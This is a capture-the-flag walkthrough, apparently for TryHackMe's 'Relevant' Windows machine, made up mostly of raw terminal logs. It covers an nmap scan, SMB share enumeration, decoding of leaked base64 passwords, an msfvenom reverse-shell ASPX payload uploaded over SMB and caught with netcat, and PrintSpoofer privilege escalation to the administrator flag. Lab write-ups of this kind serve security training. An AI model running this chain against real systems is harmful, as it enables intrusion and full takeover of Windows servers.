@@ -1,0 +1,443 @@
+IP : 10.10.253.131
+
+👉️Nmap :
+	
+	nmap -sC -sV -A -Pn 10.10.253.131
+	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan 		times will be slower.
+	Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 16:06 GMT
+	Nmap scan report for 10.10.253.131
+	Host is up (0.35s latency).
+
+	PORT      STATE    SERVICE        VERSION
+	80/tcp    open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+	| http-methods: 
+	|_  Potentially risky methods: TRACE
+	|_http-server-header: Microsoft-IIS/10.0
+	|_http-title: IIS Windows Server
+	139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
+	445/tcp   open     microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+	3389/tcp  open     ms-wbt-server?
+	| rdp-ntlm-info: 
+	|   Target_Name: RELEVANT
+	|   NetBIOS_Domain_Name: RELEVANT
+	|   NetBIOS_Computer_Name: RELEVANT
+	|   DNS_Domain_Name: Relevant
+	|   DNS_Computer_Name: Relevant
+	|   Product_Version: 10.0.14393
+	|_  System_Time: 2021-09-04T16:17:43+00:00
+	| ssl-cert: Subject: commonName=Relevant
+	| Not valid before: 2021-09-03T16:08:56
+	|_Not valid after:  2022-03-05T16:08:56
+	|_ssl-date: 2021-09-04T16:18:20+00:00; -7s from scanner time.
+	49663/tcp open     http           Microsoft IIS httpd 10.0
+	| http-methods: 
+	|_  Potentially risky methods: TRACE
+	|_http-server-header: Microsoft-IIS/10.0
+	|_http-title: IIS Windows Server
+	49666/tcp filtered unknown
+	49668/tcp filtered unknown
+	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+	Host script results:
+	|_clock-skew: mean: 1h23m53s, deviation: 3h07m51s, median: -7s
+	| smb-os-discovery: 
+	|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+	|   Computer name: Relevant
+	|   NetBIOS computer name: RELEVANT\x00
+	|   Workgroup: WORKGROUP\x00
+	|_  System time: 2021-09-04T09:17:41-07:00
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	| smb2-security-mode: 
+	|   2.02: 
+	|_    Message signing enabled but not required
+	| smb2-time: 
+	|   date: 2021-09-04T16:17:45
+	|_  start_date: 2021-09-04T16:09:42
+	
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 137.73 seconds
+
+
+👉️SmbClient :
+	
+	smbclient -L 10.10.253.131
+	Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	nt4wrksv        Disk      
+	SMB1 disabled -- no workgroup available
+	
+	👉️smbclient \\\\10.10.253.131\\nt4wrksv
+	Enter WORKGROUP\root's password: 
+	Try "help" to get a list of possible commands.
+	smb: \> dir
+	  .                                   D        0  Sat Jul 25 21:46:04 2020
+	  ..                                  D        0  Sat Jul 25 21:46:04 2020
+	  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020
+	
+	7735807 blocks of size 4096. 4946726 blocks available
+	
+	smb: \> mget passwords.txt 
+	Get file passwords.txt? y
+	getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+	smb: \> 
+
+👉️Decoding Passwords.txt to base 64 :
+
+	echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d 
+	😎️ Bob - !P@$$W0rD!123#  				(FAKE USER)
+	
+	echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d  
+	😎️Bill - Juw4nnaM4n420696969!$$$# 
+	
+	
+👉️Dirsearch :
+	
+	python3 dirsearch.py -u 10.10.253.131:49663 -e -x 400,500 -t 50  
+
+	 _|. _ _  _  _  _ _|_    v0.4.2
+ 	(_||| _) (/_(_|| (_| )
+
+	Extensions: -x | HTTP method: GET | Threads: 50 | Wordlist size: 8995
+
+	Output File: /root/Tools/dirsearch/reports/49663_21-09-04_16-50-38.txt
+
+	Error Log: /root/Tools/dirsearch/logs/errors-21-09-04_16-50-38.log
+
+	Target: http://10.10.253.131:49663/
+
+	[16:50:40] Starting: 
+	[16:50:45] 403 -  312B  - /%2e%2e//google.com
+	[16:51:35] 403 -    2KB - /Trace.axd
+	[16:51:40] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
+	[16:52:16] 200 -    0B  - /aspnet_client/
+	[16:52:16] 301 -  164B  - /aspnet_client  ->  http://10.10.253.131:49663/aspnet_client/
+	[16:53:25] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc
+	[16:53:26] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
+	[16:53:26] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
+	[16:53:26] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+	[16:53:26] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage
+	[16:53:26] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
+	[16:53:26] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
+	[16:53:26] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true
+	[16:53:26] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
+	[16:53:26] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
+	[16:53:26] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
+	[16:53:26] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
+
+	Task Completed
+
+👉️Uploading file via SMBCLIENT :
+	smbclient \\\\10.10.78.169\\nt4wrksv
+	Enter WORKGROUP\root's password: 
+	Try "help" to get a list of possible commands.
+	smb: \> put test.txt
+	putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
+	smb: \> put pwn.aspx
+	putting file pwn.aspx as \pwn.aspx (2.8 kb/s) (average 1.1 kb/s)
+	smb: \> 
+
+
+👉️Getting reverse shell :
+	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.9.236 LPORT=5555 -f aspx -o pwn.aspx
+	[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+	[-] No arch selected, selecting arch: x64 from the payload
+	No encoder specified, outputting raw payload
+	Payload size: 460 bytes
+	Final size of aspx file: 3410 bytes
+	Saved as: pwn.aspx
+
+
+	curl http://10.10.207.72:49663/nt4wrksv/pwn.aspx
+	
+	
+
+👉️Gaining Access :
+	
+	nc  -nlvp 5555
+	listening on [any] 5555 ...
+	connect to [10.17.9.236] from (UNKNOWN) [10.10.207.72] 49808
+	Microsoft Windows [Version 10.0.14393]
+	(c) 2016 Microsoft Corporation. All rights reserved.
+
+	c:\windows\system32\inetsrv>dir	
+	dir
+ 	Volume in drive C has no label.
+ 	Volume Serial Number is AC3C-5CB5
+
+ 	Directory of c:\windows\system32\inetsrv
+
+	09/06/2021  02:31 AM    <DIR>          .
+	09/06/2021  02:31 AM    <DIR>          ..
+	07/25/2020  08:05 AM           235,008 abocomp.dll
+	07/25/2020  08:05 AM           323,584 adsiis.dll
+	07/25/2020  08:05 AM           119,808 appcmd.exe
+	07/16/2016  06:20 AM             3,810 appcmd.xml
+	07/25/2020  08:05 AM           184,320 AppHostNavigators.dll
+	07/25/2020  08:05 AM            64,512 apphostsvc.dll
+	07/25/2020  08:05 AM           405,504 appobj.dll
+	07/25/2020  08:05 AM           501,248 asp.dll
+	07/25/2020  08:05 AM            22,196 asp.mof
+	07/25/2020  08:05 AM           129,536 aspnetca.exe
+	07/25/2020  08:05 AM            23,040 asptlb.tlb
+	07/25/2020  08:05 AM            40,960 authanon.dll
+	07/25/2020  08:05 AM            37,888 authbas.dll
+	07/25/2020  08:05 AM            53,248 authsspi.dll
+	07/25/2020  08:05 AM            75,776 browscap.dll
+	07/25/2020  08:05 AM            34,474 browscap.ini
+	07/25/2020  08:05 AM            25,088 cachfile.dll
+	07/25/2020  08:05 AM            50,688 cachhttp.dll
+	07/25/2020  08:05 AM            14,848 cachtokn.dll
+	07/25/2020  08:05 AM            14,336 cachuri.dll
+	07/25/2020  08:05 AM           102,912 Cnfgprts.ocx
+	07/25/2020  08:05 AM            87,040 coadmin.dll
+	07/25/2020  08:05 AM    <DIR>          config
+	07/25/2020  08:05 AM            20,480 defdoc.dll
+	07/25/2020  08:05 AM            39,424 diprestr.dll
+	07/25/2020  08:05 AM    <DIR>          en
+	07/25/2020  08:05 AM    <DIR>          en-US
+	07/25/2020  08:05 AM            68,096 filter.dll
+	09/06/2021  02:31 AM    <DIR>          History
+	07/25/2020  08:05 AM            22,016 httpmib.dll
+	07/25/2020  08:05 AM            17,920 hwebcore.dll
+	07/25/2020  08:05 AM            63,105 iis.msc
+	07/25/2020  08:05 AM            48,997 iis6.msc
+	07/25/2020  08:05 AM            26,624 iisadmin.dll
+	07/25/2020  08:05 AM         1,011,712 iiscfg.dll
+	07/25/2020  08:05 AM           322,048 iiscore.dll
+	07/25/2020  08:05 AM           101,888 iisetw.dll
+	07/25/2020  08:05 AM           104,960 iisext.dll
+	07/25/2020  08:05 AM           167,936 iisfreb.dll
+	07/25/2020  08:05 AM           109,568 iisreg.dll
+	07/25/2020  08:05 AM           230,912 iisres.dll
+	07/25/2020  08:05 AM            37,888 iisrstas.exe
+	07/25/2020  08:05 AM           190,464 iissetup.exe
+	07/25/2020  08:05 AM            72,192 iissyspr.dll
+	07/25/2020  08:05 AM            14,336 iisual.exe
+	07/25/2020  08:05 AM           265,728 iisui.dll
+	07/25/2020  08:05 AM            81,408 IISUiObj.dll
+	07/25/2020  08:05 AM           290,816 iisutil.dll
+	07/25/2020  08:05 AM           568,832 iisw3adm.dll
+	07/25/2020  08:05 AM            48,128 iiswsock.dll
+	07/25/2020  08:05 AM            17,408 inetinfo.exe
+	07/25/2020  08:05 AM           985,600 inetmgr.dll
+	07/25/2020  08:05 AM           125,440 InetMgr.exe
+	07/25/2020  08:05 AM            25,088 InetMgr6.exe
+	07/25/2020  08:05 AM           256,512 infocomm.dll
+	07/25/2020  08:05 AM            29,696 iprestr.dll
+	07/25/2020  08:05 AM           122,368 isapi.dll
+	07/25/2020  08:05 AM            67,072 isatq.dll
+	07/25/2020  08:05 AM            25,088 iscomlog.dll
+	07/25/2020  08:05 AM            38,400 loghttp.dll
+	07/25/2020  08:05 AM            90,624 logui.ocx
+	07/25/2020  08:05 AM           685,464 MBSchema.bin.00000000h
+	07/25/2020  08:05 AM           266,906 MBSchema.xml
+	07/25/2020  08:05 AM    <DIR>          MetaBack
+	09/06/2021  02:31 AM            10,152 MetaBase.xml
+	07/25/2020  08:05 AM           299,520 metadata.dll
+	07/25/2020  08:05 AM           143,360 Microsoft.Web.Administration.dll
+	07/25/2020  08:05 AM         1,052,672 Microsoft.Web.Management.dll
+	07/25/2020  08:05 AM            41,984 modrqflt.dll
+	07/25/2020  08:05 AM           492,544 nativerd.dll
+	07/25/2020  08:05 AM            21,504 protsup.dll
+	07/25/2020  08:05 AM            10,240 rpcref.dll
+	07/25/2020  08:05 AM            33,792 rsca.dll
+	07/25/2020  08:05 AM            51,200 rscaext.dll
+	07/25/2020  08:05 AM            44,032 static.dll
+	07/25/2020  08:05 AM            18,944 svcext.dll
+	07/25/2020  08:05 AM           193,024 uihelper.dll
+	07/25/2020  08:05 AM            23,552 urlauthz.dll
+	07/25/2020  08:05 AM            19,968 validcfg.dll
+	07/25/2020  08:05 AM           145,480 w3core.mof
+	07/25/2020  08:05 AM            15,872 w3ctrlps.dll
+	07/25/2020  08:05 AM            30,208 w3ctrs.dll
+	07/25/2020  08:05 AM           110,592 w3dt.dll
+	07/25/2020  08:05 AM             2,560 w3isapi.mof
+	07/25/2020  08:05 AM            83,456 w3logsvc.dll
+	07/25/2020  08:05 AM            29,696 w3tp.dll
+	07/25/2020  08:05 AM            24,576 w3wp.exe
+	07/25/2020  08:05 AM            72,192 w3wphost.dll
+	07/25/2020  08:05 AM            39,936 wamreg.dll
+	07/25/2020  08:05 AM            31,744 wbhstipm.dll
+	07/25/2020  08:05 AM            27,648 wbhst_pm.dll
+	07/25/2020  08:05 AM           480,072 WebAdministration.mof
+	07/25/2020  08:05 AM           387,584 wmi-appserver.dll
+	07/25/2020  08:05 AM            12,288 WMSvc.exe
+	07/16/2016  06:19 AM               165 wmsvc.exe.config
+	07/25/2020  08:05 AM           172,032 XPath.dll
+	              91 File(s)     13,333,557 bytes
+	               7 Dir(s)  20,257,431,552 bytes free
+	
+	c:\windows\system32\inetsrv>cd 
+	cd 
+	c:\windows\system32\inetsrv
+
+	c:\windows\system32\inetsrv>cd /
+	cd /
+	
+	c:\>dir
+	dir
+	 Volume in drive C has no label.
+	 Volume Serial Number is AC3C-5CB5
+	
+ 	Directory of c:\
+	
+	07/25/2020  08:16 AM    <DIR>          inetpub
+	07/25/2020  08:42 AM    <DIR>          Microsoft
+	07/16/2016  06:23 AM    <DIR>          PerfLogs
+	07/25/2020  08:00 AM    <DIR>          Program Files
+	07/25/2020  04:15 PM    <DIR>          Program Files (x86)
+	07/25/2020  02:03 PM    <DIR>          Users
+	07/25/2020  04:16 PM    <DIR>          Windows
+	               0 File(s)              0 bytes
+               7 Dir(s)  20,257,222,656 bytes free
+	
+	c:\>cd Users
+	cd Users
+	
+	c:\Users>dir
+	dir
+	 Volume in drive C has no label.
+	 Volume Serial Number is AC3C-5CB5
+
+ 	Directory of c:\Users
+		
+	07/25/2020  02:03 PM    <DIR>          .
+	07/25/2020  02:03 PM    <DIR>          ..
+	07/25/2020  08:05 AM    <DIR>          .NET v4.5
+	07/25/2020  08:05 AM    <DIR>          .NET v4.5 Classic
+	07/25/2020  10:30 AM    <DIR>          Administrator
+	07/25/2020  02:03 PM    <DIR>          Bob
+	07/25/2020  07:58 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               7 Dir(s)  20,257,230,848 bytes free
+
+	c:\Users>cd Bob
+	cd Bob
+
+	c:\Users\Bob>dir
+	dir
+ 	Volume in drive C has no label.
+ 	Volume Serial Number is AC3C-5CB5
+
+ 	Directory of c:\Users\Bob
+
+	07/25/2020  02:03 PM    <DIR>          .
+	07/25/2020  02:03 PM    <DIR>          ..
+	07/25/2020  02:04 PM    <DIR>          Desktop
+               0 File(s)              0 bytes
+               3 Dir(s)  20,257,243,136 bytes free
+
+	c:\Users\Bob>cd Desktop	
+	cd Desktop
+
+	c:\Users\Bob\Desktop>dir
+	dir
+ 	Volume in drive C has no label.
+ 	Volume Serial Number is AC3C-5CB5
+
+	 Directory of c:\Users\Bob\Desktop
+
+	07/25/2020  02:04 PM    <DIR>          .
+	07/25/2020  02:04 PM    <DIR>          ..
+	07/25/2020  08:24 AM                35 user.txt
+               1 File(s)             35 bytes
+               2 Dir(s)  20,257,259,520 bytes free
+
+	c:\Users\Bob\Desktop>type user.txt
+	type user.txt
+	THM{fdk4ka34vk346ksxfr21tg789ktf45}
+	c:\Users\Bob\Desktop>cd ..
+	cd ..
+
+	c:\Users\Bob>cd ..
+	cd ..
+
+	c:\Users>dir
+	dir
+ 	Volume in drive C has no label.
+ 	Volume Serial Number is AC3C-5CB5
+
+ 	Directory of c:\Users
+
+	07/25/2020  02:03 PM    <DIR>          .
+	07/25/2020  02:03 PM    <DIR>          ..
+	07/25/2020  08:05 AM    <DIR>          .NET v4.5
+	07/25/2020  08:05 AM    <DIR>          .NET v4.5 Classic
+	07/25/2020  10:30 AM    <DIR>          Administrator
+	07/25/2020  02:03 PM    <DIR>          Bob
+	07/25/2020  07:58 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               7 Dir(s)  20,257,259,520 bytes free
+
+	c:\Users>cd Administrator
+	cd Administrator
+	Access is denied.
+
+
+👉️Priviledge Access :
+	
+	c:\Users>whoami /priv
+	whoami /priv
+
+	PRIVILEGES INFORMATION
+	----------------------
+
+	Privilege Name                Description                               State   
+	============================= ========================================= ========
+	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+	SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+	SeAuditPrivilege              Generate security audits                  Disabled
+	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+	SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+	SeCreateGlobalPrivilege       Create global objects                     Enabled 
+	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+	
+	
+	I found the printspoofer vulnerbaility while researching and upload the exec file using smbclient.
+	smb: \> put PrintSpoofer.exe 
+	putting file PrintSpoofer.exe as \PrintSpoofer.exe (28.0 kb/s) (average 28.0 kb/s)
+	smb: \> 
+
+	
+	c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
+	PrintSpoofer.exe -i -c cmd
+	[+] Found privilege: SeImpersonatePrivilege
+	[+] Named pipe listening...
+	[+] CreateProcessAsUser() OK
+	Microsoft Windows [Version 10.0.14393]
+	(c) 2016 Microsoft Corporation. All rights reserved.
+
+	C:\Windows\system32>cd /	
+	
+	C:\Users\Administrator>cd Desktop
+	cd Desktop
+
+	C:\Users\Administrator\Desktop>dir
+	dir
+	 Volume in drive C has no label.
+	 Volume Serial Number is AC3C-5CB5
+
+	 Directory of C:\Users\Administrator\Desktop
+
+	07/25/2020  08:24 AM    <DIR>          .
+	07/25/2020  08:24 AM    <DIR>          ..
+	07/25/2020  08:25 AM                35 root.txt
+               1 File(s)             35 bytes
+               2 Dir(s)  20,222,754,816 bytes free
+
+	C:\Users\Administrator\Desktop>type root.txt
+	type root.txt
+	THM{1fk5kf469devly1gl320zafgl345pv}
+
+
+
+
